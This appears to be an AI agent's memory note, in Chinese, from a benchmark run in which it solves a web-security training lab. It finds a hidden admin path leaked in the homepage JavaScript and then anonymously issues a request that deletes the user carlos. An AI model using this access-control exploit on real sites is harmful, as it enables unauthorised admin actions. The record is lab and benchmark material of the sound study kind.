---
metadata:
  node_type: memory
name: "PRS arm A unprotected admin functionality unpredictable URL"
description: "arm A 基线:lab-unprotected-admin-functionality-with-unpredictable-url 冷实例一次通过(首页 JS 泄露 /admin-003s2b → 匿名 delete carlos → banner solved)"
last_updated: 2026-10-08T18:44:47+08:00
created: 2026-10-08T18:44:47+08:00
---

## 2026-10-08 arm A 基线

lab: `lab-unprotected-admin-functionality-with-unpredictable-url` (access-control)。
冷实例一次通过,无跃迁争议(range_launch reused:false)。

链条(全走件):
1. `page_read <lab-page-url>` → lab_id sha256 `878a6a3a...f446f`。
2. `range_launch launch <lab_id> --jar /tmp/cj1.json` → 实例 `0aa0000d049108fd80ba8f570072003c`,reused:false。
3. `http_dump <base>/ --out /tmp/lab-home.html` → `text_grep admin` 命中首页内联脚本:
   `var isAdmin = false; if (isAdmin) { ... setAttribute('href','/admin-003s2b') }`
   ⇒ 随机化路径由页面自身 JS 泄露,未登录也读得到,isAdmin 分支只是隐藏入口。
4. `http_dump <base>/admin-003s2b` → 200,面板列出 wiener/carlos 与
   `/admin-003s2b/delete?username=carlos`。
5. `http_session get <base>/admin-003s2b/delete?username=carlos --jar /tmp/cj1.json` → 302 Location `/admin-003s2b`(删除生效)。
6. `banner_verdict <base>/` → solved:true + "Congratulations, you solved the lab!"。

要点/坑:
- 本题变体只靠「读首页源码」即得路径,不需要站点地图/robots.txt。
- 直接匿名访问管理员面板返回 200:无鉴权,路径不可猜是唯一"保护"。
- `http_session` 第一个参数必是子命令(get/post/...),裸 URL 会 exit 2。

纪律:未读题解、未读本题相关 records/memory、全走件、未 git 提交。

